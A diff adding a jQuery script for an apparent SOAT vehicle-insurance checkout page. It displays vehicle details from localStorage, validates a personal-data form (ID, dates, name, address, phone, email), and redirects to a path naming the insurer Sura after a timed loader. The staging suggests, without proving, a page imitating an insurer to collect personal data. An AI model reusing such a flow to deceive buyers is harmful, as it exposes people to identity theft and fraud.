@@ -1,0 +1,125 @@
+$(document).ready(function () {
+  const cache1 = localStorage.getItem("placa");
+  const cache3 = localStorage.getItem("marca");
+  const cache4 = localStorage.getItem("linea");
+  const cache13 = localStorage.getItem("modelo");
+  const cache5 = "PARTICULAR";
+  let cache6 = "";
+  let cache9 = "";
+
+  if (/\d{3}$/.test(cache1)) {
+    cache6 = "VEHÍCULO";
+    cache9 = "6";
+  } else {
+    cache6 = "MOTOCICLETA";
+    cache9 = "2";
+  }
+
+  const cache7 = localStorage.getItem("cilindraje");
+  const cache12 = localStorage.getItem("valor");
+  const numero = parseInt(cache12, 10);
+  const numeroFormateado = new Intl.NumberFormat("es-CO").format(numero);
+
+  $("#valuePlaca").text(cache1);
+  $("#placaModalAgain").text(cache1);
+  $("#marca").text(cache3);
+  $("#marcaMovil").text(cache3);
+  $("#linea").text(cache4);
+  $("#lineaMovil").text(cache4);
+  $("#modelovehic").text(cache13);
+  $("#modelovehicMovil").text(cache13);
+  $("#typeOfService").text(cache5);
+  $("#classVehi").text(cache6);
+  $("#cilindrajeDeEsaMonda").text(cache7);
+  $("#pajaCeros").text(cache9);
+  $("#precio").text(numeroFormateado);
+  $("#precioMovil").text(numeroFormateado);
+
+  function validarInputs() {
+    const valorInput2 = $("#numeroDni").val().trim();
+    const valorInput3 = $("#datepicker2").val().trim();
+    const valorInput4 = $("#datepicker3").val().trim();
+    const valorInput5 = $("#firstName").val().trim();
+    const valorInput6 = $("#lastName").val().trim();
+    const valorInput7 = $("#paisDeNac").val().trim();
+    const valorInput8 = $("#ciudadDeCir").val().trim();
+    const valorInput9 = $("#direccionDeR").val().trim();
+    const valorInput10 = $("#telephone").val().trim();
+    const valorInput11 = $("#emailCorreo").val().trim();
+
+    const cumpleInput2 = valorInput2.length >= 7;
+    const cumpleInput3 = valorInput3.length > 1;
+    const cumpleInput4 = valorInput4.length > 1;
+    const cumpleInput5 = valorInput5.length >= 3;
+    const cumpleInput6 = valorInput6.length >= 3;
+    const cumpleInput7 = valorInput7.length >= 3;
+    const cumpleInput8 = valorInput8.length >= 3;
+    const cumpleInput9 = valorInput9.length >= 3;
+    const cumpleInput10 = valorInput10.length == 10;
+    const cumpleInput11 = valorInput11.length >= 9;
+
+    if (
+      cumpleInput2 &&
+      cumpleInput3 &&
+      cumpleInput4 &&
+      cumpleInput5 &&
+      cumpleInput6 &&
+      cumpleInput7 &&
+      cumpleInput8 &&
+      cumpleInput9 &&
+      cumpleInput10 &&
+      cumpleInput11
+    ) {
+      $(".btnComprar").prop("disabled", false);
+      $(".btnpreciomov").prop("disabled", false);
+    } else {
+      $(".btnComprar").prop("disabled", true);
+      $(".btnpreciomov").prop("disabled", true);
+    }
+  }
+
+  validarInputs();
+
+  $(
+    "#numeroDni, #datepicker2, #datepicker3, #firstName, #lastName, #paisDeNac, #ciudadDeCir, #direccionDeR, #telephone, #emailCorreo"
+  ).on("input", function () {
+    validarInputs();
+  });
+
+  $(".btnComprar").on("click", function () {
+    $("#fondoNegro").addClass("show");
+    $("#fondoNegro").removeClass("displayNone");
+    $("#modalPlacaTasSeguro").addClass("show");
+    $("#modalPlacaTasSeguro").removeClass("displayNone");
+  });
+
+  $(".btnpreciomov").on("click", function () {
+    $("#fondoNegro").addClass("show");
+    $("#fondoNegro").removeClass("displayNone");
+    $("#modalPlacaTasSeguro").addClass("show");
+    $("#modalPlacaTasSeguro").removeClass("displayNone");
+  });
+
+  $("#cerrarModalManito").on("click", function () {
+    $("#fondoNegro").removeClass("show");
+    $("#fondoNegro").addClass("displayNone");
+    $("#modalPlacaTasSeguro").removeClass("show");
+    $("#modalPlacaTasSeguro").addClass("displayNone");
+  });
+
+  $("#btnConfirmarModal").on("click", function () {
+    $("#fondoNegro").removeClass("show");
+    $("#fondoNegro").addClass("displayNone");
+    $("#modalPlacaTasSeguro").removeClass("show");
+    $("#modalPlacaTasSeguro").addClass("displayNone");
+    $("#loader").addClass("displayBlock");
+
+    setTimeout(function () {
+      window.location.href = "../../../sarlaft/sura/validacion";
+    }, 3000);
+  });
+
+  $("#btnBackModal").on("click", function () {
+    window.location.href = "../seguro-obligatorio/";
+  });
+});
